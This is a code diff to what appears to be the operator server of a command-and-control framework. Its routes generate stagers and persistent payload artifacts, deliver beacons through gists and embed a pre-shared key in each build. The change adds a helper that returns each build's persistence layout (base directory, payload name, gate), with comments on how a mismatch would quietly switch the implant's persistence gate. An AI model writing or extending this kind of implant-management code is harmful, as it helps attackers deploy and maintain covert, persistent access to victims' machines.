@@ -479,6 +479,36 @@ def _stagers_for_build(gen_cfg: dict, drops, oneliner_unix: str,
     }
 
 
+def _layout_for_response(gen_cfg: dict) -> dict:
+    """The build's layout, as the bundle builder's arguments want it.
+
+    `tools/build_interpreter_bundle.py` requires `--base-dir` and takes
+    `--payload-name` and `--gate`, and all three are minted per build by
+    `_persistence_config_for_build`. Without them in the response an
+    operator cannot build a bundle for the artifact they just generated:
+    `docs/TUNNEL.md` told them to pass "the build's base_dir" and left
+    them decoding the config blob out of a `deob` preview truncated to
+    2000 characters.
+
+    A mismatch is not loud, which is why this is worth a field rather
+    than a paragraph. The startup hook runs whatever payload name the
+    bundle was built with, so the payload still starts; it is
+    `_bundled_payload` under the `argc` gate that then points at a file
+    which is not there, and the build silently falls back to the `path`
+    gate -- reversing the telemetry choice the operator made.
+
+    None of the three is a secret. All three are inside the artifact and
+    inside the rendered stager already; the PSK is the thing that never
+    comes back out of this process, and it is not here.
+    """
+    block = gen_cfg.get("persistence") or {}
+    return {
+        "base_dir": block.get("base_dir") or "",
+        "payload_name": block.get("payload_name") or "",
+        "gate": block.get("gate") or "",
+    }
+
+
 def _log_generated_tunnel(gen_cfg: dict, event: str) -> str:
     """Record which build was issued a tunnel; return its identity, or "".
 
@@ -1861,6 +1891,9 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             # and retire it later. Never the PSK: the credential leaves
             # this process once, into the artifact.
             "tunnel_identity": tunnel_identity,
+            # The three per-build values `tools/build_interpreter_bundle.py`
+            # needs on its command line, which nothing else reports.
+            **_layout_for_response(gen_cfg),
         })
 
     # ── Beacon gist delivery ──
@@ -2001,6 +2034,8 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             "size": len(stage),
             # As in the other route: the identity, never the PSK.
             "tunnel_identity": tunnel_identity,
+            # And the build's layout, which the bundle builder requires.
+            **_layout_for_response(gen_cfg),
         })
 
     @app.route("/api/server/beacon-gist/<gist_id>", methods=["DELETE"])
